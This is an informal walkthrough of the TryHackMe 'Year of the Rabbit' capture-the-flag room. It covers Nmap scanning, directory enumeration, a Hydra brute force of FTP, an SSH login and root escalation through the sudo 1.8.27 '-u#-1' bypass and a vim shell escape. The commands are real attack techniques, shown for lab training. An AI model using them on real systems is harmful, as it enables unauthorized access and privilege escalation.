# TryHackMe - Year of the Rabbit

## Tools used

1. Nmap
2. Gobuster
3. Dirsearch 
4. Exiftool
5. Strings
6. Hydra
7. Burpsuite
8. Searchsploit (ExploitDB)

## Scanning and Enumeration

NOTE: The IP will be represented as **10.10.x.x** due to the different IP's given by TryHackMe

After getting the IP, run 4 Nmap scans.

### Half TCP Scan

```
nmap -sS -vv -T5 -p 1-20000 10.10.x.x -oN Half-TCP.txt
```

### Version scan / Banner grabbing

```
nmap -sV --version-all -vv -T5 -p 21,22,80 10.10.x.x -oN Version-scan.txt
```

### Aggressive scan

```
nmap -A -vv -T5 10.10.x.x -oN Aggressive-scan.txt
```

### Nmap NSE vulnerability scan

```
nmap --script vuln -p 21,80 -vv -T5 10.10.x.x -oN NSE-scan.txt
```

Whatever the results of the scans is what you will use throughout the CTF challenge and to your advantage

## Enumeration of the website

After the scanning and enumeration of the box, shift your focus to the website hosted on port 80.

Enumerate the website using either Dirsearch or Gobuster or both.

```
dirsearch -u http://10.10.x.x -t 120
```

```
gobuster dir -u http://10.10.x.x -w /path/to/directory/wordlist -X /path/to/extension/wordlist -t 120
```

After the enumeration, you should see a **".html"** and **".css"** file, open the css file and you should see a clue there hinting at a directory.  

I'm gonna be real honest, this is the part where it confuses me the most.  

Before going to the hidden directory, make sure to turn off your JavaScript and how to turn off JavaScript? Search it online guys, the internet exists for a reason :)

After turning off Javascript, it should automatically redirect you to the directory. If my memory is correct, you should see a video there.  

Play the video and you should **HEAR** the hint.

---

If you didn't get the hint, the burping sound hints at you to use Burpsuite, turn on your proxy and start intercepting the packets.  

What you should do here next is to go back to the initial directory with Javascript off, then turn it back on then go back to the Javascript locked directory. In Burpsuite, you should see a the website calling to another hidden directory.  

If this does not work then use another writeup. Copy and paste the hidden directory and go to that directory and extract it's content.

## Steganography

After extracting the picture, run the command below:

```
strings Hot-Babe.png
```

You should see a FTP username and a list of passwords, store the username and passwords in a separate file.

## Attacking FTP

Using the extracted credentials, use the Kali Linux tool called Hydra to brute force your way into the FTP server

```
hydra -L user.txt -P extracted-pass.txt ftp://10.10.x.x
```

Using the command above you can direct your password brute force attack to the FTP server.

After logging in to FTP, extract the only file stored in the server.

## Decoding Brainfuck Encryption

If you cat out the contents of the file, it's encoded in Brainfuck encryption. Look for a online decoder, copy and paste the contents and extract the credentials

## Logging into SSH and Switching Users

Using the extracted credentials, log in to SSH.  
After logging in to SSH, you should see a message there hinting to another user in the system.

Don't bother to try to look for and extract the user flag, the user that you logged into does not have the permission to read that file

Instead, run the command below:

```
locate s3cr3t
```

If you read the messagee, it hints at a possible directory or file that could be accessed.  
Go to that directory and cat out the file, it's hard to miss.

If you cat out th file, you should see the password for the other user in the system. After getting the password, switch users to that user.

```
su gwendoline
```

Provide the password and you've successfully switched users.

## Privilege Escalation

If your user is **"gwendoline"**, you can now eextract the user flag.  
Next is privilege escalation.  

Run the command 

```
sudo -l
```

And you will see that, the user can run everything that is not root.  
That hints at a sudo vulnerability. 

Use **"searchsploit"** to find an available exploit.

```
searchsploit sudo 1.8.27 - Security Bypass
```

That should give you the necessary exploit.

Run the exploit below with the program and file it can open with elevated privileges

```
sudo -u#-1 <program_that_can_run_with_privileges> <file_that_can_run_with_privileges>
```

If you successfully opened it, it should open vim. An advance type of text editor

Run the command below on Vim's terminal:

```
:!#/bin/bash
```

or

```
:!/bin/bash
```

After that, it should give you root access.  
Go to the root directory and extract the file and you've successfully pawned the system
